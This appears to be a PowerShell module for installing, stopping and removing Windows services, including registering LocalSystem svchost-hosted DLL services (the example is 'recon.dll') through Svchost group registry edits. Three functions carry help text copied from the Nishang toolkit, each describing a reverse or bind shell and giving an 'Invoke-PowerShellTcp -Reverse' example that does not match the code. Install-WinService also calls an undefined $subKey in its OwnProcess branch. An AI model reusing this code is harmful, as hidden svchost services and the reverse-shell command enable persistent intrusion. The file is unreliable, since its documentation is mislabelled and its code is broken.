<#
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜
#̷𝓍   🇵​​​​​🇴​​​​​🇼​​​​​🇪​​​​​🇷​​​​​🇸​​​​​🇭​​​​​🇪​​​​​🇱​​​​​🇱​​​​​ 🇸​​​​​🇨​​​​​🇷​​​​​🇮​​​​​🇵​​​​​🇹​​​​​ 🇧​​​​​🇾​​​​​ 🇬​​​​​🇺​​​​​🇮​​​​​🇱​​​​​🇱​​​​​🇦​​​​​🇺​​​​​🇲​​​​​🇪​​​​​🇵​​​​​🇱​​​​​🇦​​​​​🇳​​​​​🇹​​​​​🇪​​​​​.🇶​​​​​🇨​​​​​@🇬​​​​​🇲​​​​​🇦​​​​​🇮​​​​​🇱​​​​​.🇨​​​​​🇴​​​​​🇲​​​​​
#>



function Get-AccesschkPath{   
    [CmdletBinding(SupportsShouldProcess)]
    param()
    try{
        $accesschkCmd = Get-Command 'accesschk64.exe' -ErrorAction Ignore
        if(($accesschkCmd -ne $Null ) -And (test-path -Path "$($accesschkCmd.Source)" -PathType Leaf)){
            $accesschkApp = $accesschkCmd.Source
            Write-Verbose "✅ Found accesschk64.exe CMD [$accesschkApp]"
            Return $accesschkApp 
        }
        ""
     }catch{
         Write-Error $_
         throw $_
     }
}

function Get-SetAclPath{   
    [CmdletBinding(SupportsShouldProcess)]
    param()
    try{
        $setaclCmd = Get-Command 'setacl.exe' -ErrorAction Ignore
        if(($setaclCmd -ne $Null ) -And (test-path -Path "$($setaclCmd.Source)" -PathType Leaf)){
            $setaclPath = $setaclCmd.Source
            Write-Verbose "✅ Found setacl.exe CMD [$setaclPath]"
            Return $setaclPath 
        }
        ""
     }catch{
         Write-Error $_
         throw $_
     }
}


function Uninstall-WinService{
    <#
    .SYNOPSIS
    Removes/deletes a service.
 
    .DESCRIPTION
    Removes an existing Windows service. If the service doesn't exist, nothing happens. The service is stopped before being deleted, so that the computer doesn't need to be restarted for the removal to complete.
 
    .LINK
    Uninstall-WinService
 
    .EXAMPLE
    Uninstall-WinService -Name DeathStar
 
    Removes the Death Star Windows service. It is destro..., er, stopped first, then destro..., er, deleted. If only the rebels weren't using Linux!
    #>
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$Name
    )
    try{
        $ReturnCode = 0
        $service = Get-Service -Name $Name -ErrorAction Ignore
        $sc = Join-Path -Path $env:WinDir -ChildPath 'system32\sc.exe' -Resolve
        $xsvc = "c:\Programs\SystemTools\xsvc.exe"

        if( -not $service )
        {
            $Message = '[Uninstall-WinService] [{0}] SERVICE DOES NOT EXIST' -f $Name
            Write-Output $Message
            return
        }

        $origVerbosePref = $VerbosePreference
        $VerbosePreference = 'SilentlyContinue'

        $cimService = Get-CimInstance 'Win32_Service' -Filter ('Name = ''{0}''' -f $service.Name)
        $cimServiceProcessCount = 0
        if( $cimService )
        {
            $cimServiceProcessCount = Get-CimInstance 'Win32_Service' -Filter ('ProcessId = ''{0}''' -f $cimService.ProcessId) |
                                                Measure-Object |
                                                Select-Object -ExpandProperty 'Count'
        }
        $VerbosePreference = $origVerbosePref

        if( -not $pscmdlet.ShouldProcess( "service '$Name'", "remove" ) )
        {
            return
        }

        Stop-Service $Name
        if( $cimService -and $cimServiceProcessCount -eq 1 )
        {
            $process = Get-Process -Id $cimService.ProcessId -ErrorAction Ignore
            if( $process )
            {
                $killService = $true

                if( $killService )
                {
                    Write-Verbose -Message ('[Uninstall-WinService] [{0}] Killing service process "{1}".' -f $Name,$process.Id)
                    Stop-Process -Id $process.Id -Force
                }
            }
        }

        Write-Verbose -Message ('[Uninstall-WinService] [{0}] {1} delete {0}' -f $Name,$sc)
        $output = & $sc delete $Name
        if( $LASTEXITCODE )
        {
            if( $LASTEXITCODE -eq 1072 )
            {
                Write-Warning -Message ('The {0} service is marked for deletion and will be removed during the next reboot.{1}{2}' -f $Name,([Environment]::NewLine),($output -join ([Environment]::NewLine)))
            }
            else
            {
                Write-Error -Message ('Failed to uninstall {0} service (returned non-zero exit code {1}):{2}{3}' -f $Name,$LASTEXITCODE,([Environment]::NewLine),($output -join ([Environment]::NewLine)))
            }
        }
        else
        {
            $output | Write-Output
        }
    }catch{
         Write-Error $_
         throw $_
    }
 }



function Stop-WinService{
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$true, HelpMessage="service Name", Position=0)]
        [string]$Name
    )

  try{
        $service = Get-Service -Name $Name -ErrorAction Ignore
        
        if( -not $service )
        {
            $Message = '[Stop-WinService] [{0}] SERVICE DOES NOT EXIST' -f $Name
            Write-Output $Message
            return
        }

        $origVerbosePref = $VerbosePreference
        $VerbosePreference = 'SilentlyContinue'

        $cimService = Get-CimInstance 'Win32_Service' -Filter ('Name = ''{0}''' -f $service.Name)
        $cimServiceProcessCount = 0
        if( $cimService )
        {
            $cimServiceProcessCount = Get-CimInstance 'Win32_Service' -Filter ('ProcessId = ''{0}''' -f $cimService.ProcessId) |
                                                Measure-Object |
                                                Select-Object -ExpandProperty 'Count'
        }
        $VerbosePreference = $origVerbosePref

        if( -not $pscmdlet.ShouldProcess( "Service '$Name'", "Stop" ) )
        {
            return
        }

        Stop-Service $Name
        if( $cimService -and $cimServiceProcessCount -eq 1 )
        {
            $process = Get-Process -Id $cimService.ProcessId -ErrorAction Ignore
            if( $process ){
                Write-Verbose -Message ('[Stop-WinService] [{0}] Killing service process "{1}".' -f $Name,$process.Id)
                Stop-Process -Id $process.Id -Force
            }
        }    
 
     }catch{
         Write-Error $_
     }
 }


function Install-WinService{

    <#
    .SYNOPSIS
    Install a service.
 
    .DESCRIPTION
    Install a Windows service, this cmdlet also creates all the registry entries required for the service to be fuctional. It supports both SharedProcess and OwnProcess types  
 
    .LINK
    Install-WinService
 
    .EXAMPLE
    Install-WinService -Name "_dev_service_06" -Path "F:\ServiceRoot\System32\recon.dll" -GroupName "defragsvc" -StartupType Automatic -SharedProcess
    Install-WinService -Name "_dev_service_06" -Path "F:\ServiceRoot\System32\recon.dll" -GroupName "mygroup" -StartupType Automatic -SharedProcess
    
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$true, HelpMessage="service Name", Position=0)]
        [string]$Name,
        [Parameter(Mandatory=$true, HelpMessage="DllPath", Position=1)]
        [string]$Path,
        [Parameter(Mandatory=$false, HelpMessage="Description")]
        [string]$Description,
        [Parameter(ParameterSetName="SharedProcess",Mandatory=$true, HelpMessage="groupname")]
        [string]$GroupName,
        [Parameter(Mandatory=$false, HelpMessage="Mode")]
        [ValidateSet('Manual','Automatic',"AutomaticDelayedStart","Disabled")]
        [string]$StartupType="Automatic",    
        [Parameter(ParameterSetName="SharedProcess",Mandatory=$false, HelpMessage="Service that shares a process with one or more other services.")]
        [switch]$SharedProcess,    
        [Parameter(ParameterSetName="OwnProcess",Mandatory=$false, HelpMessage="Service that shares a process with one or more other services.")]
        [switch]$OwnProcess  
    )
    
     try{
        if($PsCmdlet.ParameterSetName -eq 'SharedProcess'){
            $inf = Get-Item -Path $Path 
            if( $inf.Extension -ne '.dll'){
                Write-Warning "Service Type SharedProcess, not SharedProcess. But using binary with Extension $($inf.Extension)"
                return;
            }
        }
    
        if($PsCmdlet.ParameterSetName -eq 'OwnProcess'){
            $inf = Get-Item -Path $Path 
            if( $inf.Extension -ne '.exe'){
                Write-Warning "Service Type OwnProcess, not SharedProcess. But using binary with Extension $($inf.Extension)"
                return;
            }
        }
       
        # verify if the service already exists, and if yes remove it first
        if (Get-Service $Name -ErrorAction SilentlyContinue)
        {
            Uninstall-WinService $Name
        }
    
        Write-Verbose "installing service`n   name $Name`n   binaryPathName $binaryPath`n   displayName $Name`n   startupType Automatic"

        $mycreds = New-Object System.Management.Automation.PSCredential ("LocalSystem", (new-object System.Security.SecureString))
        
        $binaryPath = "{0} -k {1}" -f "%SystemRoot%\system32\svchost.exe", $GroupName
 
        if($PsCmdlet.ParameterSetName -eq 'OwnProcess'){
            $binaryPath = $Path
        }

        if([string]::IsNullOrEmpty($Description)){
            $DateStr = (Get-Date).GetDateTimeFormats()[14]
            $Description = "Service `"{0}`" created on {1}" -f $Name, $DateStr
        }
        # creating widnows service using all provided parameters
        $Null = New-Service -name $Name -binaryPathName $binaryPath -displayName $Name -Description "$Description" -startupType Automatic -credential $mycreds

        #$RegView = [Microsoft.Win32.RegistryView]::Registry64
        #$basekey = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $RegView)
        #$subKey = $basekey.OpenSubKey("SYSTEM\CurrentControlSet\Services\$Name",$true)

        $ScExe=(get-command sc.exe).Source
        if($PsCmdlet.ParameterSetName -eq 'SharedProcess'){
            Set-GroupConfig $Name $GroupName $Path
            #$subKey.SetValue("Type",0x20)
            $OutSc =  &"$ScExe" 'config' "$Name" 'type=' 'share'
            Write-Output $OutSc
        }else{
            $subKey.SetValue("Type",0x10)
            $OutSc =  &"$ScExe" 'config' "$Name" 'type=' 'own'
            Write-Output $OutSc
        }

        "[Install-WinService] SUCCESS"
     }catch{
         Write-Error $_
         throw $_
     }
 }


function Set-GroupConfig{

 <#
 .SYNOPSIS
 Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.

 .EXAMPLE
 PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

 #>
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="service Name", Position=0)]
        [string]$Name,
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="groupname", Position=1)]
        [string]$GroupName,
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="DllPath", Position=2)]
        [string]$DllPath     
    )


     try{
        $RegistryPath="HKLM:\SYSTEM\CurrentControlSet\services\{0}\Parameters" -f $Name
        $Null=New-Item -Path $RegistryPath -ItemType Directory -Force -ErrorAction Ignore
        $Null = New-ItemProperty -Path $RegistryPath -Name 'ServiceDll' -Value $DllPath -PropertyType ExpandString -Force 

        $RegView = [Microsoft.Win32.RegistryView]::Registry64
        $basekey = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $RegView)
        $subKey = $basekey.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost",$true)
        $CurrentGroups = $subKey.GetValueNames()
        $GroupExists = $CurrentGroups.Contains($GroupName)
         
        if($GroupExists -eq $True){
            Write-Verbose "Group $GroupName already exists. Adding service in list for group."
            [string[]]$AllGroupServices=$subKey.GetValue($GroupName)
            $AllGroupServices+=$Name
            $subKey.SetValue($GroupName,$AllGroupServices)
        }else{
            $RegistryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
            [string[]]$Value=@($Name)
            $Null = New-ItemProperty -Path $RegistryPath -Name $GroupName -Value $Value -PropertyType MultiString -Force 
        }

        $newGroupKey = $subKey.CreateSubKey($Name, $true)
     }catch{
        Write-Error $_
        throw $_
     }
 }


function Set-InteractiveService{

 <#
 .SYNOPSIS
 Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.

 .EXAMPLE
 PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

 #>
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="service Name", Position=0)]
        [string]$Name,  
        [Parameter(Mandatory=$true)]
        [bool]$Interactive 
    )
    Write-Warning "DEPRECATED - MAY NOT BE WORKING IN NEWER WINDOWS VERSION > Vista"
     try{
        $service = Get-Service -Name $Name -ErrorAction Ignore
        if(!($service)){ throw "no such service $Name"}
        $TypeShare = $service.ServiceType -match "Win32ShareProcess"
        [int]$Val = 0
        [string]$Type='own'
        if($TypeShare){
            [string]$Type='share'
        }
        if($False -eq $Interactive){
            [int]$Val = 1
        }
        $RegistryPath="HKLM:\SYSTEM\CurrentControlSet\Control\Windows"
        $Null = Set-ItemProperty -Path $RegistryPath -Name 'NoInteractiveServices' -Value $Val -Force 

        $ScExe=(get-command sc.exe).Source
        if($False -eq $Interactive){
            $OutSc =  &"$ScExe" 'config' "$Name" 'type=' "$Type"
        }else{
            $OutSc =  &"$ScExe" 'config' "$Name" 'type=' "$Type" 'type=' 'interact'
        }
        
        Write-Output $OutSc

     }catch{
        Write-Error $_
        throw $_
     }
 }



function Remove-ServiceGroupConfig{

 <#
 .SYNOPSIS
 Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.

 .EXAMPLE
 PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

 #>
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="service Name", Position=0)]
        [string]$Name   
    )


     try{
        $RegView = [Microsoft.Win32.RegistryView]::Registry64
        $basekey = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $RegView)
        $subKey = $basekey.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost",$true)
        $subKey.DeleteSubKeyTree($Name, $False)
        $Changes = 0
        $CurrentGroups = $subKey.GetValueNames()
        ForEach($gname in $CurrentGroups){
            [string[]]$sclist = $subKey.GetValue($gname)
            $contains = $sclist.Contains($Name)
            if($True -eq $contains){
                $sclistcount = $sclist.Count 
                if($sclistcount -le 1){
                    $Changes++
                    $RegistryPath="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
                    Write-Verbose "Remove-ItemProperty $RegistryPath - $gname"
                    $vlog = Remove-ItemProperty -Path $RegistryPath -Name "$gname" -Force
                    Write-Verbose "$vlog "
                }else{
                    $Changes++
                    [string[]]$sclistcopy = @()
                    ForEach($scname in $sclist){
                        if($scname -ne $Name){
                            $sclistcopy += $scname
                        }
                    }
                    Write-Verbose "New values for $gname"
                    ForEach($scname in $sclistcopy){  Write-Verbose "  $scname" }
                    $subKey.SetValue($gname,$sclistcopy)
                }
            }
        }

        Write-Verbose "Remove-ServiceGroupConfig Changes: $Changes"
     }catch{
        Write-Error $_
        throw $_
     }
 }
